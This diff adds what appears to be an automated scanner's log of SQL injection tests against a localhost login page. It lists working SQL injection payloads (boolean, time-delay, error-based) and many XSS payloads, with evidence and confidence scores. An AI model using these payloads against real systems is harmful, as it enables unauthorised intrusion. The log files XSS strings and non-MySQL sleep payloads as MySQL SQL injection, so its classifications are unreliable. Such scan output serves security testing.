@@ -1,1 +1,434 @@
+
+handler: common
+url: http://localhost/login.php
+parameters: ['name', 'password']
+method: POST
+Type: sql_injection
+Pattern_Type: boolean
+payload: ["' or 1=1 -- -;<img src=x>//", "' or 1>1 -- -;<img src=x>//"]
+Confidence: 50
+Evidence: Response length difference 4362 bytes
+Response_Times: ['0.12s', '1.48s']
+Response_Lengths: [82, 4444]
+------------------------------------------------------------------
+
+
+handler: common
+url: http://localhost/login.php
+parameters: ['name', 'password']
+method: POST
+Type: sql_injection
+Pattern_Type: error
+payload: <svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(1);//'>
+Confidence: 70
+Evidence: SQL error detected (MySQL)
+Response_Time: 1.48s
+Response_Length: 4720
+------------------------------------------------------------------
+
+
+handler: common
+url: http://localhost/login.php
+parameters: ['name', 'password']
+method: POST
+Type: sql_injection
+Pattern_Type: error
+payload: '"<script>alert({{1234**3}})</script><!---
+Confidence: 70
+Evidence: SQL error detected (MySQL)
+Response_Time: 2.49s
+Response_Length: 4669
+------------------------------------------------------------------
+
+
+handler: common
+url: http://localhost/login.php
+parameters: ['name', 'password']
+method: POST
+Type: sql_injection
+Pattern_Type: error
+payload: <img src=x onerror='javascript:alert(6)'>
+Confidence: 70
+Evidence: SQL error detected (MySQL)
+Response_Time: 0.45s
+Response_Length: 4723
+------------------------------------------------------------------
+
+
+handler: common
+url: http://localhost/login.php
+parameters: ['name', 'password']
+method: POST
+Type: sql_injection
+Pattern_Type: error
+payload: <img src='a' alt="test" onload=javascript%3Aalert`6`>
+Confidence: 70
+Evidence: SQL error detected (MySQL)
+Response_Time: 2.49s
+Response_Length: 4720
+------------------------------------------------------------------
+
+
+handler: common
+url: http://localhost/login.php
+parameters: ['name', 'password']
+method: POST
+Type: sql_injection
+Pattern_Type: error
+payload: '"<script>#{1234**3};alert(1)</script><img src=x onerror=alert(2)><!--
+Confidence: 70
+Evidence: SQL error detected (MySQL)
+Response_Time: 3.50s
+Response_Length: 4634
+------------------------------------------------------------------
+
+
+handler: common
+url: http://localhost/login.php
+parameters: ['name', 'password']
+method: POST
+Type: sql_injection
+Pattern_Type: error
+payload: " onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
+Confidence: 70
+Evidence: SQL error detected (MySQL)
+Response_Time: 0.14s
+Response_Length: 4866
+------------------------------------------------------------------
+
+
+handler: common
+url: http://localhost/login.php
+parameters: ['name', 'password']
+method: POST
+Type: sql_injection
+Pattern_Type: error
+payload: '"><iframe onload=alert('{{1234**3}}');>
+Confidence: 70
+Evidence: SQL error detected (MySQL)
+Response_Time: 0.06s
+Response_Length: 4828
+------------------------------------------------------------------
+
+
+handler: common
+url: http://localhost/login.php
+parameters: ['name', 'password']
+method: POST
+Type: sql_injection
+Pattern_Type: error
+payload: ' OR WAITFOR DELAY "00:00:05"-- 
+Confidence: 70
+Evidence: SQL error detected (MySQL)
+Response_Time: 0.03s
+Response_Length: 4753
+------------------------------------------------------------------
+
+
+handler: common
+url: http://localhost/login.php
+parameters: ['name', 'password']
+method: POST
+Type: sql_injection
+Pattern_Type: error
+payload: ' AND SLEEP(5)/*
+Confidence: 70
+Evidence: SQL error detected (MySQL)
+Response_Time: 0.03s
+Response_Length: 4700
+------------------------------------------------------------------
+
+
+handler: common
+url: http://localhost/login.php
+parameters: ['name', 'password']
+method: POST
+Type: sql_injection
+Pattern_Type: time_delay
+payload: SLEEP(5) /*' or SLEEP(5) or '" or SLEEP(5) or "*/
+Confidence: 60
+Evidence: Response delayed 10.08s
+Response_Time: 10.08s
+Response_Length: 0
+------------------------------------------------------------------
+
+
+handler: common
+url: http://localhost/login.php
+parameters: ['name', 'password']
+method: POST
+Type: sql_injection
+Pattern_Type: error
+payload: "' AND IF(1=1,SLEEP(5),0)--
+Confidence: 70
+Evidence: SQL error detected (MySQL)
+Response_Time: 0.03s
+Response_Length: 4686
+------------------------------------------------------------------
+
+
+handler: common
+url: http://localhost/login.php
+parameters: ['name', 'password']
+method: POST
+Type: sql_injection
+Pattern_Type: error
+payload: ' OR pg_sleep(5)
+Confidence: 70
+Evidence: SQL error detected (MySQL)
+Response_Time: 0.03s
+Response_Length: 4698
+------------------------------------------------------------------
+
+
+handler: common
+url: http://localhost/login.php
+parameters: ['name', 'password']
+method: POST
+Type: sql_injection
+Pattern_Type: error
+payload: ' || BEGIN DBMS_SESSION.SLEEP(5); END; -- 
+Confidence: 70
+Evidence: SQL error detected (MySQL)
+Response_Time: 0.03s
+Response_Length: 4738
+------------------------------------------------------------------
+
+
+handler: common
+url: http://localhost/login.php
+parameters: ['name', 'password']
+method: POST
+Type: sql_injection
+Pattern_Type: error
+payload: ' || BEGIN DBMS_SESSION.SLEEP(5); END; -- 
+Confidence: 70
+Evidence: SQL error detected (MySQL)
+Response_Time: 0.03s
+Response_Length: 4738
+------------------------------------------------------------------
+
+
+handler: advanced
+url: http://localhost/login.php
+parameters: ['name', 'password']
+method: POST
+Detail_Vuln: Error-Based SQL Injection
+payload: ' AND 1=CONVERT(int,(SELECT @@version)) --
+Confidence: 100
+Evidence: Error message observed in response
+Context:  access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &
+------------------------------------------------------------------
+
+
 Final Arrange Result
+
+handler: common, advanced
+url: http://localhost/login.php
+parameters: ['name', 'password']
+method: POST
+Type: sql_injection
+Detected: True
+Common_payload: ["' or 1=1 -- -;<img src=x>//", "' or 1>1 -- -;<img src=x>//"]
+Common_Confidence: 50
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=CONVERT(int,(SELECT @@version)) --
+Advanced_Confidence: 100
+Context:  access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://localhost/login.php
+parameters: ['name', 'password']
+method: POST
+Type: sql_injection
+Detected: True
+Common_payload: <svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(1);//'>
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=CONVERT(int,(SELECT @@version)) --
+Advanced_Confidence: 100
+Context:  access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://localhost/login.php
+parameters: ['name', 'password']
+method: POST
+Type: sql_injection
+Detected: True
+Common_payload: '"<script>alert({{1234**3}})</script><!---
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=CONVERT(int,(SELECT @@version)) --
+Advanced_Confidence: 100
+Context:  access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://localhost/login.php
+parameters: ['name', 'password']
+method: POST
+Type: sql_injection
+Detected: True
+Common_payload: <img src=x onerror='javascript:alert(6)'>
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=CONVERT(int,(SELECT @@version)) --
+Advanced_Confidence: 100
+Context:  access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://localhost/login.php
+parameters: ['name', 'password']
+method: POST
+Type: sql_injection
+Detected: True
+Common_payload: <img src='a' alt="test" onload=javascript%3Aalert`6`>
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=CONVERT(int,(SELECT @@version)) --
+Advanced_Confidence: 100
+Context:  access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://localhost/login.php
+parameters: ['name', 'password']
+method: POST
+Type: sql_injection
+Detected: True
+Common_payload: '"<script>#{1234**3};alert(1)</script><img src=x onerror=alert(2)><!--
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=CONVERT(int,(SELECT @@version)) --
+Advanced_Confidence: 100
+Context:  access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://localhost/login.php
+parameters: ['name', 'password']
+method: POST
+Type: sql_injection
+Detected: True
+Common_payload: " onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=CONVERT(int,(SELECT @@version)) --
+Advanced_Confidence: 100
+Context:  access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://localhost/login.php
+parameters: ['name', 'password']
+method: POST
+Type: sql_injection
+Detected: True
+Common_payload: '"><iframe onload=alert('{{1234**3}}');>
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=CONVERT(int,(SELECT @@version)) --
+Advanced_Confidence: 100
+Context:  access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://localhost/login.php
+parameters: ['name', 'password']
+method: POST
+Type: sql_injection
+Detected: True
+Common_payload: ' OR WAITFOR DELAY "00:00:05"-- 
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=CONVERT(int,(SELECT @@version)) --
+Advanced_Confidence: 100
+Context:  access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://localhost/login.php
+parameters: ['name', 'password']
+method: POST
+Type: sql_injection
+Detected: True
+Common_payload: ' AND SLEEP(5)/*
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=CONVERT(int,(SELECT @@version)) --
+Advanced_Confidence: 100
+Context:  access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://localhost/login.php
+parameters: ['name', 'password']
+method: POST
+Type: sql_injection
+Detected: True
+Common_payload: SLEEP(5) /*' or SLEEP(5) or '" or SLEEP(5) or "*/
+Common_Confidence: 60
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=CONVERT(int,(SELECT @@version)) --
+Advanced_Confidence: 100
+Context:  access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://localhost/login.php
+parameters: ['name', 'password']
+method: POST
+Type: sql_injection
+Detected: True
+Common_payload: "' AND IF(1=1,SLEEP(5),0)--
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=CONVERT(int,(SELECT @@version)) --
+Advanced_Confidence: 100
+Context:  access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://localhost/login.php
+parameters: ['name', 'password']
+method: POST
+Type: sql_injection
+Detected: True
+Common_payload: ' OR pg_sleep(5)
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=CONVERT(int,(SELECT @@version)) --
+Advanced_Confidence: 100
+Context:  access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://localhost/login.php
+parameters: ['name', 'password']
+method: POST
+Type: sql_injection
+Detected: True
+Common_payload: ' || BEGIN DBMS_SESSION.SLEEP(5); END; -- 
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=CONVERT(int,(SELECT @@version)) --
+Advanced_Confidence: 100
+Context:  access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://localhost/login.php
+parameters: ['name', 'password']
+method: POST
+Type: sql_injection
+Detected: True
+Common_payload: ' || BEGIN DBMS_SESSION.SLEEP(5); END; -- 
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=CONVERT(int,(SELECT @@version)) --
+Advanced_Confidence: 100
+Context:  access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &
+------------------------------------------------------------------
